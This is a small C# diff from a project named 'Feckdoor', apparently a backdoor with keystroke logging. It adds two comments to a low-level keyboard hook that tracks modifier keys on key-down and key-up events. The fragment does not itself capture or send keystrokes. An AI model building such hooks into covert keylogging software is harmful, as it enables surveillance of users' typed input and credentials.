@@ -45,12 +45,14 @@ namespace Feckdoor.InputLog
 						Log.Fatal(e, "Exception on keyboard hook event.");
 					} // trunc
 
+					// Activate modifier
 					int? modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
 					if (modifier != null)
 						ActiveModifiers |= (int)modifier;
 				}
 				else if (wParam == (IntPtr)User32.WM_KEYUP || wParam == (IntPtr)User32.WM_SYSKEYUP)
 				{
+					// Deactive modifier
 					ActiveModifiers &= ~(int)(((VirtualKey)lParam.vkCode).GetModifier() ?? 0);
 				}
 			}
